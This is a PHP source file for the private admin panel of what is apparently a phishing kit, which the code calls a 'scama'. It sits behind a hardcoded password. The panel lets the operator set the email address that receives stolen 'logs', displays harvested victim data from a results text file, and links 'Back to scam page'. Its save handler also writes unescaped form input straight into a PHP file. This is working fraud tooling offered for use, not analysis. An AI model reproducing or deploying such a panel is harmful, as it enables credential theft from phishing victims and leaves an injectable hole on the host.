<html>
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" href="../Core/Styles/upgrade/bootstrap.min.css" type="text/css" />
	<link rel="icon" href="../images/static/favicon.ico" type="image/x-icon" />
</head>


<title>Private PAGE</title>
<?php
// checking email.php file

$file = '../email.php';
if(!is_file($file)){
    $contents = '<?php' . "\r\n" . "\r\n";
    $contents .= '// Paste your fucking MAILS bro' . "\r\n" . "\r\n";
    $contents .= '$email = "";' . "\r\n";
    $contents .=  '?>' . "\r\n";

    file_put_contents($file, $contents);
}

include "../email.php";

?>

<?php
@session_start();
@set_time_limit(0);

//PASSWORD CONFIGURATION

@$pass = $_POST['pass'];
$chk_login = true;
$password = "imsrabon";

//END CONFIGURATION

if($pass == $password)
{
 $_SESSION['nst'] = "$pass";
}

if($chk_login == true)
{
 if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password)
 {
 die("
  <center>
  <table border=0 cellpadding=0 cellspacing=0 width=100% height=100%>
  <tr><td valign=middle align=center>
  <table width=200 height=100 bgcolor=white border=2 bordercolor=green><tr><td>
  <table width=300 height=200 bgcolor=white border=2 bordercolor=green><tr><td>
  <font size=2 face=Arial><center>
  <b></font></a><br></b>
  </center>
  <form method=post>
  <font size=4 face=Arial color=black><strong><center>Enter Secret Code </center></strong><br></font>
  <center><input type=password name=pass size=30>
  </form><br><br><center>
  <b><center><font size=2 face=Arial color=black>Logged IP:</b> ".$_SERVER["REMOTE_ADDR"]."
  </td></tr></table>
  <center>Press Enter to get access.</center>
  </td></tr></table>
  ");
 }
}

set_time_limit(0);error_reporting(0);
?>


<body>
<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <a class="navbar-brand" href="index.php">ADMIN PANEL</a>

    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="index.php">Home <span class="sr-only">(current)</span></a>
      </li>
    </ul>

<?php

if (isset($_POST["logoff"])){
	session_destroy();
	header("location: index.php");
}

if (isset($_POST["save"])){
	$filename = "../email.php";

	if (file_exists($filename)){
	    //echo "File exist.";
	    unlink ($filename);
		if(!is_file($filename)){
		    $contents = '<?php' . "\r\n" . "\r\n";
		    $contents .= '// Paste your fucking MAILS bro' . "\r\n" . "\r\n";
		    $contents .= '$email = "' . $_POST["email"] . '";' . "\r\n";
		    $contents .=  '?>' . "\r\n";

		    file_put_contents($filename, $contents);
		    header ("location: index.php");
		}
	}
}
?>

    <form class="form-inline my-2 my-lg-0" method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']);?>">
      <button class="btn btn-outline-danger my-2 my-sm-0" type="submit" name="logoff">Log Off</button>
    </form>
  </div>
</nav>

<div class="container">
	<div class="row">
		<div class="col-md-6">
			<div class="card mt-3">
			  <div class="card-body">
			  	<form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']);?>">
			  		  <div class="form-group">
					    <label for="exampleFormControlInput1">Email address</label>
					    <p><span class="small te<?php echo htmlspecialchars($_SERVER['PHP_SELF']);?>xt-muted">You will get your logs on this mail</span></p>
					    <input type="email" name="email" class="form-control" id="exampleFormControlInput1" placeholder="email" value="<?php echo $email; ?>">
					    <span class="text-muted small font-weight-light">
	<?php
	$filename = "../email.php";
	if (file_exists($filename)){
	    echo "File exist.";
	}else{
	    echo "File does not exist.";
	}
	?>				    </span>
					  </div>
					  <button type="submit" name="save" class="btn btn-primary">Save</button>
			  	</form>
			  </div>
			  <div class="card-footer text-muted">
			    <?php $server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
			    $my_ip = $_SERVER['REMOTE_ADDR'];
			    echo "server: " . $server_ip . " " . "your ip: " . $myip;
			    ?>
			  </div>
			</div>
		</div>
		<div class="col-md-6">
			<div class="card mt-3">
			  <div class="card-body">
				  <div class="form-group">
				    <label for="exampleFormControlInput1">Results</label>
				    <textarea rows="10" class="form-control" readonly><?php
							$filename = "../vau_nen.txt";
							if (file_exists($filename)){
							    //echo "File exist.";
							    echo file_get_contents( $filename );
							}else{
							    echo "No result file exist. Go back scama and test first.";
							}
				    	?></textarea>
				    	<a href="../index.php" class="btn btn-primary mt-3">Back to scam page</a>
				  </div>
			  </div>
			</div>
		</div>
	</div>

</div>

</nav>
</body>
</html>